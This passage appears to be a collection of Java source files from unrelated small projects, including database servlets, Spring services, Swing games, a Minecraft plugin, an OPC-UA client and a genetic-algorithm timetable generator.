std_sub1, std_sub2, std_sub3, std_sub4, std_sub5) values(?,?,?,?,?,?,?,?)\";\r\n\r\n\t\ttry {\r\n\t\t\tConnection con = obj.getConnection();\r\n\t\t\tPreparedStatement ptmt = con.prepareStatement(query);\r\n\t\t\tptmt.setString(1, name);\r\n\t\t\tptmt.setString(2, caste);\r\n\t\t\tptmt.setString(3, cert_name);\r\n\t\t\tptmt.setString(4, sub1);\r\n\t\t\tptmt.setString(5, sub2);\r\n\t\t\tptmt.setString(6, sub3);\r\n\t\t\tptmt.setString(7, sub4);\r\n\t\t\tptmt.setString(8, sub5);\r\n\r\n\t\t\tint i = ptmt.executeUpdate();\r\n\t\t\tif (i == 1) {\r\n\t\t\t\tout.println(\"<html>\");\r\n\t\t\t\tout.println(\"<head>\");\r\n\t\t\t\tout.println(\"</head>\");\r\n\t\t\t\tout.println(\"<body>\");\r\n\t\t\t\tout.println(\"<script type=\\\"text/javascript\\\">\");\r\n\t\t\t\tout.println(\"alert('Data saved into database successfully!!!');\");\r\n\t\t\t\tout.println(\"location='index.jsp';\");\r\n\t\t\t\tout.println(\"</script>\");\r\n\t\t\t\tout.println(\"</body></htm>\");\r\n\t\t\t} else {\r\n\t\t\t\tout.println(\"<html>\");\r\n\t\t\t\tout.println(\"<head>\");\r\n\t\t\t\tout.println(\"</head>\");\r\n\t\t\t\tout.println(\"<body>\");\r\n\t\t\t\tout.println(\"<script type=\\\"text/javascript\\\">\");\r\n\t\t\t\tout.println(\"alert('Error occured during data save into database!!!');\");\r\n\t\t\t\tout.println(\"location='index.jsp';\");\r\n\t\t\t\tout.println(\"</script>\");\r\n\t\t\t\tout.println(\"</body></htm>\");\r\n\t\t\t}\r\n\t\t} catch (Exception e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t}\r\n}",
    "package ru.gazimov.simbirsofttest.pages;\n\nimport io.qameta.allure.Step;\nimport lombok.Getter;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.support.FindBy;\nimport org.openqa.selenium.support.PageFactory;\nimport org.openqa.selenium.support.ui.Select;\n\n@Getter\npublic class LoginPage {\n\n    @FindBy(xpath = \"//button[text() = 'Customer Login']\")\n    private WebElement customerLoginButton;\n\n    @FindBy(xpath = \"//label[text() = 'Your Name :']/../select\")\n    private WebElement selector;\n\n    @FindBy(xpath = \"//option[text() = 'Harry Potter']\")\n    private WebElement harryPotter;\n\n    @FindBy(xpath = \"//button[text() = 'Login']\")\n    private WebElement loginButton;\n\n    public LoginPage(WebDriver driver) {\n        PageFactory.initElements(driver, this);\n    }\n\n\n    @Step(\"\u0410\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\")\n    public void authorizeUser() {\n        customerLoginButton.click();\n        Select select = new Select(selector);\n        select.selectByValue(harryPotter.getAttribute(\"value\"));\n        loginButton.click();\n    }\n\n}\n",
    "/*\n * Copyright 2023 Thorsten Ludewig (t.ludewig@gmail.com).\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage l9g.app.ldap2moodle.model;\n\nimport com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonInclude;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport lombok.Getter;\nimport lombok.Setter;\nimport lombok.ToString;\n\n/**\n *\n * @author Thorsten Ludewig (t.ludewig@gmail.com)\n */\n@ToString\n@Getter\n@Setter\n@JsonIgnoreProperties(ignoreUnknown = true)\n@JsonInclude(JsonInclude.Include.NON_EMPTY)\npublic class MoodleUser\n{\n  @JsonProperty(access = JsonProperty.Access.WRITE_ONLY)\n  private Integer id;\n\n  private String username;\n\n  private String firstname;\n\n  private String lastname;\n\n  private String fullname;\n\n  private String email;\n\n  private String department;\n\n  private int firstaccess;\n\n  private int lastaccess;\n\n  private String auth;\n\n  private boolean suspended;\n\n  private boolean confirmed;\n\n  private String lang;\n\n  private String theme;\n\n  private String timezone;\n\n  private int mailformat;\n\n  private String description;\n\n  private int descriptionformat;\n\n  private String country;\n\n  private String profileimageurlsmall;\n\n  private String profileimageurl;\n}\n",
    "package cn.ac.ios.Utils.json.bean;\n\nimport com.alibaba.fastjson.JSONArray;\nimport com.alibaba.fastjson.JSONObject;\nimport org.apache.commons.io.FileUtils;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.ArrayList;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        FileInputStream fileInputStream = new FileInputStream(\"data/json/out.js.json\");\n        int len;\n        byte[] bytes = new byte[1024];\n        StringBuilder stringBuffer = new StringBuilder();\n        while ((len = fileInputStream.read(bytes)) != -1) {\n            stringBuffer.append(new String(bytes, 0, len));\n        }\n        fileInputStream.close();\n        JSONArray jsonArray = JSONObject.parseArray(stringBuffer.toString());\n        ArrayList<String> regexs = new ArrayList<>();\n        ArrayList<String> filenames = new ArrayList<>();\n        for (int i = 0; i < jsonArray.size(); i++) {\n            JSONObject jsonObject = jsonArray.getJSONObject(i);\n            String filename = jsonObject.getString(\"filename\");\n            JSONArray array = jsonObject.getJSONArray(\"regexps\");\n            for (int j = 0; j < array.size(); j++) {\n                JSONObject object = array.getJSONObject(j);\n                String pattern = object.getString(\"pattern\");\n                if(\"DYNAMIC-PATTERN\".equals(pattern)){\n                    continue;\n                }\n                regexs.add(pattern);\n                filenames.add(filename);\n            }\n        }\n        FileUtils.writeLines(new File(\"data/json/out_regex.js.txt\"),regexs);\n        FileUtils.writeLines(new File(\"data/json/out_filename.js.txt\"),filenames);\n    }\n}\n",
    "package com.turing.api.article.service;\n\nimport com.turing.api.article.model.Article;\nimport com.turing.api.article.model.ArticleDto;\nimport com.turing.api.article.repository.ArticleRepository;\nimport com.turing.api.board.model.Board;\nimport com.turing.api.common.component.PageRequestVo;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\n\nimport java.util.List;\nimport java.util.Optional;\n\n@Service\n@RequiredArgsConstructor\npublic class ArticleServiceImpl implements ArticleService {\n\n    private final ArticleRepository repository;\n\n    @Override\n    public void dummy() {    }\n\n    @Override\n    public ArticleDto save(ArticleDto articleDto) {\n        Long id = articleDto.getWriterId();\n\n        return entityToDto(Optional.of(\n                repository.save(dtoToEntity(articleDto))));\n    }\n\n    @Override\n    public void deleteById(Long id) {\n    repository.deleteById(id);\n    }\n\n    @Override\n    public List<ArticleDto> findAll(PageRequestVo vo) {\n//        return repository.findAll(vo);\n        return null;\n    }\n\n    @Override\n    public Optional<ArticleDto> findById(Long id) {\n        return Optional.of(entityToDto(repository.findById(id)));\n    }\n\n    @Override\n    public long count() {\n        return repository.count();\n    }\n\n    @Override\n    public boolean existsById(Long id) {\n        return repository.existsById(id);\n    }\n}",
    "package fr.tathan.mom.mechanics.effects;\n\nimport fr.tathan.mom.Utils;\nimport io.th0rgal.oraxen.api.OraxenItems;\nimport org.bukkit.entity.Entity;\nimport org.bukkit.entity.LivingEntity;\nimport org.bukkit.entity.Player;\nimport org.bukkit.event.EventHandler;\nimport org.bukkit.event.Listener;\nimport org.bukkit.event.entity.EntityDamageByEntityEvent;\nimport org.bukkit.inventory.ItemStack;\n\npublic class EffectsMechanicManager implements Listener {\n\n    private final EffectsMechanicFactory factory;\n\n    public EffectsMechanicManager(EffectsMechanicFactory factory) {\n        this.factory = factory;\n    }\n\n    @EventHandler\n    public void onPlayerUse(EntityDamageByEntityEvent event) {\n        Entity entity = event.getEntity();\n        Entity damager = event.getDamager();\n        if (!(damager instanceof Player)) return;\n        if (!(entity instanceof LivingEntity)) return;\n\n        Player player = (Player) damager;\n        LivingEntity livingEntity = (LivingEntity) entity;\n\n        ItemStack item = player.getInventory().getItemInMainHand();\n        String itemID = OraxenItems.getIdByItem(item);\n        System.out.println(itemID);\n        EffectsMechanic mechanic = (EffectsMechanic) factory.getMechanic(item);\n        if (factory.isNotImplementedIn(itemID)) return;\n        if (mechanic == null) return;\n        System.out.println(mechanic.getEffects());\n\n        mechanic.getEffects().forEach(effect -> {\n            livingEntity.addPotionEffect(Utils.getPotionEffect(effect));\n        });\n    }\n\n}\n",
    "import java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.WindowEvent;\r\nimport java.awt.event.WindowListener;\r\nimport java.util.Random;\r\nimport javax.swing.*;\r\n\r\npublic class Loteria extends JFrame {\r\n\r\n    private final JButton numericGame = new JButton(\"Jogo Num\u00e9rico\");\r\n    private final JButton letterGame = new JButton(\"Jogo de Letras\");\r\n    private final JButton parouimparGame = new JButton(\"Par ou \u00edmpar\");\r\n    private final JButton ready = new JButton(\"Pronto\");\r\n    private final JTextField numfield = new JTextField(10);\r\n    private final JLabel numlabel = new JLabel(\"Digite um n\u00famero (0 a 100)\");\r\n    private final JLabel letterlabel = new JLabel(\"Digite uma letra (A a Z)\");\r\n    private final JLabel parouimparlabel = new JLabel(\"Escolha Par ou \u00cdmpar\");\r\n    private final JLabel titleLotoFacil = new JLabel(\"LotoF\u00e1cil\");\r\n\r\n    private int numEscolhido;\r\n    private boolean isNumericGame = false;\r\n    private boolean isLetterGame = false;\r\n    private boolean isParOuImparGame = false;\r\n\r\n    private JPanel initialPanel;\r\n\r\n    public Loteria() {\r\n        configurarComponentes();\r\n    }\r\n\r\n    private void configurarComponentes() {\r\n        setTitle(\"LotoF\u00e1cil\");\r\n        setSize(400, 500);\r\n        setLocationRelativeTo(null);\r\n        getContentPane().setBackground(new Color(28, 28, 28));\r\n\r\n        titleLotoFacil.setHorizontalAlignment(SwingConstants.CENTER);\r\n        numlabel.setHorizontalAlignment(SwingConstants.CENTER);\r\n        letterlabel.setHorizontalAlignment(SwingConstants.CENTER);\r\n        parouimparlabel.setHorizontalAlignment(SwingConstants.CENTER);\r\n        titleLotoFacil.setFont(new Font(\"Poppins\", Font.PLAIN, 20));\r\n\r\n        initialPanel = new JPanel();\r\n        initialPanel.setLayout(new GridLayout(4, 1, 20, 20));\r\n        initialPanel.add(titleLotoFacil);\r\n        initialPanel.add(numericGame);\r\n        initialPanel.add(letterGame);\r\n        initialPanel.add(parouimparGame);\r\n        add(initialPanel);\r\n\r\n        numericGame.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                isNumericGame = true;\r\n                isLetterGame = false;\r\n                isParOuImparGame = false;\r\n                showGamePanel(numlabel);\r\n            }\r\n        });\r\n\r\n        letterGame.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                isNumericGame = false;\r\n                isLetterGame = true;\r\n                isParOuImparGame = false;\r\n                showGamePanel(letterlabel);\r\n            }\r\n        });\r\n\r\n        parouimparGame.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                isNumericGame = false;\r\n                isLetterGame = false;\r\n                isParOuImparGame = true;\r\n                showGamePanel(parouimparlabel);\r\n            }\r\n        });\r\n\r\n        ready.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                handleGameResult();\r\n            }\r\n        });\r\n        this.addWindowListener(new WindowListener() {\r\n\r\n            @Override\r\n            public void windowOpened(WindowEvent e) {\r\n            }\r\n\r\n            @Override\r\n            public void windowIconified(WindowEvent e) {\r\n            }\r\n\r\n            @Override\r\n            public void windowDeiconified(WindowEvent e) {\r\n            }\r\n\r\n            @Override\r\n            public void windowDeactivated(WindowEvent e) {\r\n            }\r\n\r\n            @Override\r\n            public void windowClosing(WindowEvent e) {\r\n                fechar();\r\n            }\r\n\r\n            @Override\r\n            public void windowClosed(WindowEvent e) {\r\n            }\r\n\r\n            @Override\r\n            public void windowActivated(WindowEvent e) {\r\n            }\r\n        });\r\n    }\r\n\r\n    private void fechar() {\r\n        int resposta = JOptionPane.showConfirmDialog(\r\n                this,\r\n                \"Confirmar sa\u00edda?\",\r\n                \"?\",\r\n                JOptionPane.YES_NO_OPTION,\r\n                JOptionPane.QUESTION_MESSAGE);\r\n\r\n        if (resposta == JOptionPane.YES_OPTION) {\r\n            dispose();\r\n            System.exit(0);\r\n        } else {\r\n            setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);\r\n        }\r\n    }\r\n\r\n    private void Resetgame() {\r\n        numfield.setText(\"\");\r\n        remove(getContentPane().getComponent(1));\r\n        initialPanel.setVisible(true);\r\n        revalidate();\r\n    }\r\n\r\n    private void showGamePanel(JLabel label) {\r\n        initialPanel.setVisible(false);\r\n        JPanel gamePanel = new JPanel(new GridLayout(4, 1, 10, 10));\r\n        gamePanel.add(label);\r\n        gamePanel.add(numfield);\r\n        gamePanel.add(new JLabel());\r\n        gamePanel.add(ready);\r\n        add(gamePanel);\r",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class App {\n    JFrame frame = new JFrame();\n    JLabel textLabel = new JLabel();\n    JPanel textPanel = new JPanel();\n    JPanel boardPanel = new JPanel();\n    JButton[][] board = new JButton[3][3];\n    String playerS = \"S\";\n    String playerO = \"O\";\n    String currentPlayer = playerS;\n    boolean gameOver = false;\n    int turns = 0;\n\n    App() {\n\n\n        frame.setVisible(true);\n        frame.setTitle(\"Tic-Tac-Toe\");\n        frame.setSize(600, 650);\n        frame.setLocationRelativeTo(null);\n        frame.setResizable(false);\n        frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);\n        frame.setLayout(new BorderLayout());\n\n        textLabel.setBackground(Color.darkGray);\n        textLabel.setForeground(Color.white);\n        textLabel.setFont(new Font(\"Arial\", Font.BOLD, 50));\n        textLabel.setHorizontalAlignment(JLabel.CENTER);\n        textLabel.setText(\"Tic-Tac-Toe\");\n        textLabel.setOpaque(true);\n\n        textPanel.setLayout(new BorderLayout());\n        textPanel.add(textLabel);\n        frame.add(textPanel, BorderLayout.NORTH);\n\n        boardPanel.setLayout(new GridLayout(3, 3));\n        boardPanel.setBackground(Color.darkGray);\n        frame.add(boardPanel);\n\n        for (int r = 0; r < 3; r++) {\n            for (int c = 0; c < 3; c++) {\n                JButton tile = new JButton();\n                board[r][c] = tile;\n                boardPanel.add(tile);\n\n                tile.setBackground(Color.darkGray);\n                tile.setForeground(Color.white);\n                tile.setFont(new Font(\"Arial\", Font.BOLD, 120));\n                tile.setFocusable(true);\n\n                tile.addActionListener(new ActionListener() {\n                    @Override\n                    public void actionPerformed(ActionEvent e) {\n                        if (gameOver) return;\n                        JButton tile = (JButton) e.getSource();\n                        if (tile.getText() == \"\") {\n                            tile.setText(currentPlayer);\n                            turns++;\n                            checkWinner();\n                            if (!gameOver) {\n                                currentPlayer = currentPlayer == playerS ? playerO : playerS;\n                                textLabel.setText(currentPlayer + \" 's turn\");\n                            }\n\n\n                        }\n\n\n                    }\n                });\n\n\n            }\n\n        }\n    }\n\n    void checkWinner() {\n        for (int r = 0; r < 3; r++) {\n            if (board[r][0].getText() == \"\") continue;\n\n            if (board[r][0].getText() == board[r][1].getText() &&\n                    board[r][1].getText() == board[r][2].getText()) {\n                for (int i = 0; i < 3; i++) {\n                    setWinner(board[r][i]);\n                }\n                gameOver = true;\n                return;\n            }\n        }\n\n        for (int c = 0; c < 3; c++) {\n            if (board[0][c].getText() == \"\") continue;\n\n            if (board[0][c].getText() == board[1][c].getText() &&\n                board[1][c].getText() == board[2][c].getText()) {\n                for (int i = 0; i < 3; i++) {\n                 setWinner(board[i][c]);\n                }\n                gameOver = true;\n                return;\n            }\n\n\n            if (board[0][0].getText() == board[1][1].getText() &&\n                board[1][1].getText() == board[2][2].getText() &&\n                board[0][0].getText() != \"\") {\n                for (int i = 0; i < 3; i++) {\n                    setWinner(board[i][i]);\n                }\n                gameOver = true;\n                return;\n\n            }\n            if (board[0][2].getText() == board[1][1].getText() &&\n                    board[1][1].getText() == board[2][0].getText() &&\n                    board[0][2].getText() != \"\") {\n                    setWinner(board[0][2]);\n                    setWinner(board[1][1]);\n                    setWinner(board[2][0]);\n\n                gameOver = true;\n                return;\n            }\n\n            if (turns == 9){\n                for (int r = 0; r < 3; r++){\n                    for (c = 0; c < 3; c++){\n                        setTie(board[r][c]);\n                    }\n                }\n                gameOver = true;\n            }\n        }\n\n        }\n\n    private void setTie(JButton tile) {\n        tile.setBackground(Color.gray);\n        tile.setForeground(Color.orange);\n        textLabel.setText(\"Tie !\");\n    }\n\n    private void setWinner(JButton tile) {\n        tile.setForeground(Color.green);\n        tile.setBackground(Color.gray);\n        textLabel.setText(currentPlayer + \" is the winnwr !\");\n    }\n\n\n    public static void main(String[] args) {\n        new App();\n    }\n}\n\n\n",
    "package framework;\npublic class Computer extends Electronics {  \n    private String memory;  // \u5185\u5b58  \n    private String cpuModel; // CPU \u578b\u53f7  \n  \n    // \u6784\u9020\u65b9\u6cd5  \n    public Computer(double weight, double price, double powerConsumption, String manufacturer, String memory, String cpuModel) {  \n        super(weight, price, powerConsumption, manufacturer);  \n        this.memory = memory;  \n        this.cpuModel = cpuModel;  \n    }  \n  \n    // Getter \u548c Setter \u65b9\u6cd5  \n    public String getMemory() {  \n        return memory;  \n    }  \n  \n    public void setMemory(String memory) {  \n        this.memory = memory;  \n    }  \n  \n    public String getCpuModel() {  \n        return cpuModel;  \n    }  \n  \n    public void setCpuModel(String cpuModel) {  \n        this.cpuModel = cpuModel;  \n    }  \n  \n    // \u8986\u76d6\u7236\u7c7b\u7684\u8f93\u51fa\u8bbe\u5907\u4fe1\u606f\u7684\u65b9\u6cd5\uff0c\u589e\u52a0\u8ba1\u7b97\u673a\u7279\u6709\u7684\u5c5e\u6027  \n    @Override  \n    public void displayInfo() {  \n        super.displayInfo();  \n        System.out.println(\"Memory: \" + memory);  \n        System.out.println(\"CPU Model: \" + cpuModel);  \n    }  \n}",
    "package com.iboot.iot.milo.core.manage;\n\nimport com.iboot.iot.milo.configuration.MiloProperties;\nimport com.iboot.iot.milo.core.exception.MiloPropertiesNullPointerException;\nimport com.iboot.iot.milo.core.exception.IdentityProviderException;\nimport com.iboot.iot.milo.utils.MiloPropertiesUtil;\nimport lombok.extern.slf4j.Slf4j;\nimport org.eclipse.milo.opcua.sdk.client.OpcUaClient;\nimport org.eclipse.milo.opcua.sdk.client.api.identity.AnonymousProvider;\nimport org.eclipse.milo.opcua.sdk.client.api.identity.IdentityProvider;\nimport org.eclipse.milo.opcua.sdk.client.api.identity.UsernameProvider;\nimport org.eclipse.milo.opcua.stack.core.security.SecurityPolicy;\nimport org.eclipse.milo.opcua.stack.core.types.builtin.LocalizedText;\nimport org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.Unsigned;\nimport org.eclipse.milo.opcua.stack.core.types.structured.EndpointDescription;\nimport org.eclipse.milo.opcua.stack.core.util.EndpointUtil;\nimport org.springframework.util.StringUtils;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Objects;\nimport java.util.Optional;\n\n@Slf4j\npublic class OpcUaClientFactory {\n    public OpcUaClientFactory(MiloProperties properties) {\n        MiloPropertiesUtil.verifyProperties(properties);\n    }\n\n    /**\n     * create OPC-UA client instance\n     *\n     * @return OpcUaClient\n     * @throws Exception\n     */\n    public OpcUaClient make(MiloProperties.Config config) throws Exception {\n        OpcUaClient client = null;\n        try {\n            client = createClient(config);\n            client.connect().get();\n            return client;\n        } catch (Exception e) {\n            if (client != null) {\n                client.disconnect().get();\n            }\n            throw new InterruptedException(e.getMessage());\n        }\n    }\n\n    private OpcUaClient createClient(MiloProperties.Config config) throws Exception {\n        // verify the config again is necessary for create OPC-UA client with DB or other way dynamically\n        verifyConfig(config);\n\n        KeyStoreLoader loader = new KeyStoreLoader().load();\n\n        return OpcUaClient.create(\n                config.getEndpoint(),\n                endpoints -> {\n                    EndpointDescription description = endpoints.stream()\n                            .findFirst().orElseThrow(() -> new MiloPropertiesNullPointerException(\"no desired endpoints returned\"));\n                    if (!description.getEndpointUrl().equals(config.getEndpoint())) {\n                        URI uri = parseURI(config.getEndpoint());\n                        description = EndpointUtil.updateUrl(description, uri.getHost(), uri.getPort());\n                    }\n                    return Optional.of(description);\n                },\n                configBuilder -> configBuilder\n                        .setApplicationName(LocalizedText.english(\"milo opc-ua client\"))\n                        .setApplicationUri(\"urn:iboot-\" + config.getEndpoint() + \"-:milo:client\")\n                        .setKeyPair(loader.getClientKeyPair())\n                        .setCertificate(loader.getClientCertificate())\n                        .setCertificateChain(loader.getClientCertificateChain())\n                        .setCertificateValidator(loader.getCertificateValidator())\n                        .setIdentityProvider(identityProvider(config))\n                        .setRequestTimeout(Unsigned.uint(5000))\n                        .build()\n        );\n    }\n\n    private void verifyConfig(MiloProperties.Config config) {\n        if (Objects.isNull(config)) {\n            throw new RuntimeException(\"the config cannot be null\");\n        }\n        if (Objects.isNull(config.getSecurityPolicy())) {\n            throw new RuntimeException(\"the config's security policy cannot be null\");\n        }\n        if (SecurityPolicy.None.equals(config.getSecurityPolicy())) {\n            // don't need to verify other properties\n            return;\n        }\n        if (!StringUtils.hasText(config.getUsername())) {\n            throw new RuntimeException(\"the config's username cannot be null or empty string, because the config's security policy is not None\");\n        }\n        if (!StringUtils.hasText(config.getPassword())) {\n            throw new RuntimeException(\"the config's password cannot be null or empty string, because the config's security policy is not None\");\n        }\n    }\n\n    private URI parseURI(String endpoint) {\n        try {\n            return new URI(endpoint);\n        } catch (URISyntaxException e) {\n            throw new MiloPropertiesNullPointerException(\"the milo config's endpoint URI syntax error\");\n        }\n    }\n\n    private IdentityProvider identityProvider(MiloProperties.Config config) {\n        if (SecurityPolicy.None.equals(config.getSecurityPolicy())) {\n            return new AnonymousProvider();\n        }\n        if (StringUtils.hasText(config.getUsername()) && StringUtils.hasText(config.getPassword())) {\n            return new UsernameProvide",
    "package com.passIn.passin.controllers;\n\nimport com.passIn.passin.dto.attendee.AttendeeIdDTO;\nimport com.passIn.passin.dto.attendee.AttendeeRequestDTO;\nimport com.passIn.passin.dto.attendee.AttendeesListResponseDTO;\nimport com.passIn.passin.dto.event.EventIdDTO;\nimport com.passIn.passin.dto.event.EventRequestDTO;\nimport com.passIn.passin.dto.event.EventResponseDTO;\nimport com.passIn.passin.services.AttendeeService;\nimport com.passIn.passin.services.EventService;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.util.UriComponentsBuilder;\n\n@RestController\n@RequestMapping(\"/events\")\n@RequiredArgsConstructor\npublic class EventController {\n\n    private final EventService eventService;\n    private final AttendeeService attendeeService;\n    @GetMapping(\"/{id}\")\n    public ResponseEntity<EventResponseDTO> getEvent(@PathVariable String id){\n        EventResponseDTO event = this.eventService.getEventDetails(id);\n        return ResponseEntity.ok(event);\n    }\n\n    @PostMapping\n    public ResponseEntity<EventIdDTO> createEvent(@RequestBody EventRequestDTO body, UriComponentsBuilder uriComponentsBuilder){\n        EventIdDTO eventIdDTO = this.eventService.createEvent(body);\n\n        var uri = uriComponentsBuilder.path(\"/events/{id}\").buildAndExpand(eventIdDTO.eventId()).toUri();\n\n        return ResponseEntity.created(uri).body(eventIdDTO);\n    }\n\n    @PostMapping(\"/{eventId}/attendees\")\n    public ResponseEntity<AttendeesListResponseDTO> registerParticipant(@PathVariable String eventId){\n        AttendeesListResponseDTO attendeesListResponseDTO = this.attendeeService.getEventsAttendee(eventId);\n\n        return ResponseEntity.ok(attendeesListResponseDTO);\n    }\n\n}\n",
    "package entities;\n\nimport java.util.ArrayList;\nimport java.util.Comparator;\nimport java.util.List;\nimport java.util.stream.Collectors;\nimport service.CSVHandler;\n\npublic class Inventory {\n  private List<Product> products;\n\n  public Inventory() {\n    this.products = new ArrayList<>();\n  }\n\n  public void addProduct(Product product) {\n    this.products.add(product);\n  }\n\n  public void removeProduct(Product product) {\n    this.products.remove(product);\n  }\n\n  public List<Product> getProducts() {\n    return products;\n  }\n\n  public void consumeCSV(String fileName) {\n    this.products = CSVHandler.readCSV(fileName).getProducts();\n  }\n\n  public void generateCSV(String fileName) {\n    CSVHandler.writeCSV(this.products, fileName);\n  }\n\n  public List<Product> listAndSortProducts(String sortBy) {\n    Comparator<Product> comparator =\n        switch (sortBy.toLowerCase()) {\n          case \"category\" -> Comparator.comparing(Product::getCategory);\n          case \"price\" -> Comparator.comparing(Product::getPrice);\n          case \"date\" -> Comparator.comparing(Product::getCreationDate);\n          default -> Comparator.comparing(product -> product.getName().toLowerCase());\n        };\n\n    return this.products.stream().sorted(comparator).collect(Collectors.toList());\n  }\n}\n",
    "import java.io.BufferedReader;\r\nimport java.io.BufferedWriter;\r\nimport java.io.File;\r\nimport java.io.FileNotFoundException;\r\nimport java.io.FileOutputStream;\r\nimport java.io.FileReader;\r\nimport java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.io.OutputStreamWriter;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.StringTokenizer;\r\n\r\nimport javax.imageio.stream.FileCacheImageOutputStream;\r\n\r\npublic class Main {\r\n\t  public static void main(String[] args) throws IOException {\r\n\t    \t// Get a Timetable object with all the available information.\r\n\t        Timetable timetable = initializeTimetable();\r\n\t        \r\n\t        \r\n\t        \r\n\t        \r\n\t        // Initialize GA\r\n\t        GeneticAlgorithm ga = new GeneticAlgorithm(100, 0.01, 0.9, 2, 5);\r\n\t        \r\n\t        // Initialize population\r\n\t        Population population = ga.initPopulation(timetable);\r\n\t        \r\n\t        // Evaluate population\r\n\t        ga.evalPopulation(population, timetable);\r\n\t        \r\n\t        // Keep track of current generation\r\n\t        int generation = 1;\r\n\t        \r\n\t        // Start evolution loop\r\n\t      // int y=0;\r\n\t        while (ga.isTerminationConditionMet(generation, 1000) == false && ga.isTerminationConditionMet(population) == false) {\r\n\t            // Print fitness\r\n\t            System.out.println(\"G\" + generation + \" Best fitness: \" + population.getFittest(0).getFitness());\r\n\r\n\t            // Apply crossover\r\n\t            population = ga.crossoverPopulation(population);\r\n\r\n\t            // Apply mutation\r\n\t            population = ga.mutatePopulation(population, timetable);\r\n\r\n\t            // Evaluate population\r\n\t            ga.evalPopulation(population, timetable);\r\n\r\n\t            // Increment the current generation\r\n\t          //  y++;\r\n\t            generation++;\r\n\t        }\r\n\t     // Print fitness\r\n\t        timetable.createClasses(population.getFittest(0));\r\n\t        System.out.println();\r\n\t        System.out.println(\"Solution found in \" + generation + \" generations\");\r\n\t        System.out.println(\"Final solution fitness: \" + population.getFittest(0).getFitness());\r\n\t        System.out.println(\"Clashes: \" + timetable.calcClashes());\r\n\t        \r\n\t       File file = new File(\"src\\\\schedule.txt\");\r\n\t        \r\n\t      //Create the file\r\n\t      \r\n\t    \r\n\t\t\t\r\n\t\t\tFileOutputStream writer;\r\n\t\t\t\r\n\t\t\twriter = new FileOutputStream(file);\r\n\t\t\t\r\n\t\t\tBufferedWriter Br=new BufferedWriter(new OutputStreamWriter(writer));\r\n\t        // Print classes\r\n\t      //  System.out.println();\r\n\t        Class classes[] = timetable.getClasses();\r\n\t        int classIndex = 1;\r\n\t        for (Class bestClass : classes) {\r\n\t        \t\r\n\t        \tBr.write(\"Module: \" + timetable.getLesson(bestClass.getModuleId()).getModuleName()); \r\n\t        \t\r\n\t        \t\r\n\t        \tBr.write(\" Group: \" +  timetable.getGroup(bestClass.getGroupId()).getGroupName1());\r\n\t        \t\r\n\t        \tBr.write(\" Time: \" + timetable.getTimeslot(bestClass.getTimeslotId()).getTimeslot());\r\n\t        \tBr.write(\" Professor: \" + timetable.getProfessor(bestClass.getProfessorId()).getProfessorName());\r\n\t        \t\r\n\t        \r\n\t            \r\n\t        \tBr.write(\"-----\");\r\n\t        \tBr.newLine();\r\n\t        \tBr.newLine();\r\n\t            classIndex++;\r\n\t        }\r\n\t     Br.close();\r\n\t\twriter.close();\r\n\t\t\r\n\t     \r\n\t    \r\n\t  }\r\n\t  \r\n\t  \r\n\t  \r\n\t  \r\n\t  private static Timetable initializeTimetable() {\r\n\t\t\t// Create timetable\r\n\t\t\tTimetable timetable = new Timetable();\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tList<String> strings = new ArrayList<String>();\r\n\t\t\tBufferedReader LessonsBr = null;\r\n\t\t\ttry {\r\n\t\t\t\tLessonsBr = new BufferedReader(new FileReader(\"src\\\\lessons.txt\"));\r\n\t\t\t} catch (FileNotFoundException e1) {\r\n\t\t\t\t// TODO Auto-generated catch block\r\n\t\t\t\te1.printStackTrace();\r\n\t\t\t}\r\n\t\t\tBufferedReader TeacherBr = null;\r\n\t\t\ttry {\r\n\t\t\t\tTeacherBr = new BufferedReader(new FileReader(\"src\\\\teachers.txt\"));\r\n\t\t\t} \r\n\t\t\tcatch (FileNotFoundException e1) {\r\n\t\t\t\t// TODO Auto-generated catch block\r\n\t\t\t\te1.printStackTrace();\r\n\t\t\t}\r\n\t\t\r\n\t\t\tString saveLesson = \"\";\r\n\t\t\tString saveTeacher = \"\";\r\n\t\t\tint temp=0;\r\n\t\t\ttry {\r\n\t\t\t\twhile ((saveLesson = LessonsBr.readLine()) != null) {\r\n\t\t\t\t\twhile\t((saveTeacher = TeacherBr.readLine()) != 